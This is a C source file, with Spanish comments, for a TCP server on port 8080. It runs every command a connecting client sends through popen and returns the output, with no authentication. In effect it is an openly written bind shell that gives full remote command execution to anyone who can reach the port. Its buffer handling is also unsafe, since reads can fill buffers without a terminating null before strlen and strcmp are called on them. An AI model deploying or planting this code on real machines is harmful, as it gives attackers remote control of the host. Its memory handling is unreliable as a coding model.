#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 8080
#define BUFFER_SIZE 1024

void execute_command(char *command, char *response) {
    FILE *fp = popen(command, "r"); // Ejecuta el comando.
    if (fp == NULL) {
        strcpy(response, "Error ejecutando comando\n");
        return;
    }
    fread(response, 1, BUFFER_SIZE, fp); // Lee la salida.
    pclose(fp);
}

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    char buffer[BUFFER_SIZE] = {0};
    char response[BUFFER_SIZE] = {0};

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("Error al crear socket");
        exit(EXIT_FAILURE);
    }

    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
        perror("Error al configurar socket");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("Error al asociar socket");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 3) < 0) {
        perror("Error al escuchar");
        exit(EXIT_FAILURE);
    }

    printf("Servidor escuchando en el puerto %d...\n", PORT);

    while (1) {
        if ((new_socket = accept(server_fd, NULL, NULL)) < 0) {
            perror("Error al aceptar conexión");
            exit(EXIT_FAILURE);
        }

        printf("Cliente conectado\n");
        while (read(new_socket, buffer, BUFFER_SIZE) > 0) {
            if (strcmp(buffer, "salida\n") == 0) {
                printf("Cerrando conexión...\n");
                break;
            }
            printf("Comando recibido: %s\n", buffer);
            execute_command(buffer, response);
            send(new_socket, response, strlen(response), 0);
            memset(buffer, 0, BUFFER_SIZE);
            memset(response, 0, BUFFER_SIZE);
        }

        close(new_socket);
    }

    close(server_fd);
    return 0;
}
